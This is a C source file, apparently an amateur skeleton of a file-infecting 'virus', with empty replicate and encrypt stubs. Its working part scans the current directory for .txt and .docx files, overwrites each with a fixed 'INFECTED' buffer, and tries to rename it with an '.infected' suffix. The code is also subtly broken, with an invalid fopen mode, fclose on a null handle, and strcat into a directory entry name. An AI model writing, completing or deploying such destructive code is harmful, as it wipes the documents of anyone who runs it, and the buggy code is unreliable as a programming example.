#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#define MAX_LEN 255
#define BUFFER_LEN 1024
//something is really strange here

// 3 main thing about a virus
// + infect


// Copy itself
void replicate(){
  

}

void encryptFile(){
  

}


int infectFile(char *f_name){
  // Should be some malicous injection or something
  char buffer[BUFFER_LEN] = "INFECTED";
  FILE *f = fopen(f_name,"wr");
  // if file getting error 
  if(f == NULL){
    printf("File is shit");
    // After read the file, encrypt the content, or change the
    // write to the file
  }else{
    printf("[*] Infected %s\n",f_name);

    // write 1024 bytes into the file
    fwrite(buffer,sizeof(buffer),1,f);
  }
  fclose(f);
  return 0;
}



int searchFile(){
  DIR *d;
  struct dirent *dir;
  // file extention
  char * fileInfect[MAX_LEN] = {".txt",".docx"};
  
  // Open the currently standing folder
  d = opendir(".");

  if(d < 0){
    exit(1);
  }

  if(d){
    while((dir = readdir(d))!=NULL){
      char * fileExtension = strrchr(dir->d_name,'.');

      // Iterate through the list of file to infect
      for(int file = 0; file < 2; file++){
        
        if( (fileExtension != NULL) && (strcmp(fileExtension, fileInfect[file])) == 0){

          infectFile(dir->d_name);
          char *temp = dir->d_name;
          strcat(temp,".infected");

          // Rename the file is not cool
          if (rename(dir->d_name,temp) < 0){
            printf("Can't change file name\n");
          }else{
            printf("Change file name\n");
          }
         
        }
      }
    }
    closedir(d);  
  }
  // Exit successfully
  return 0;
}
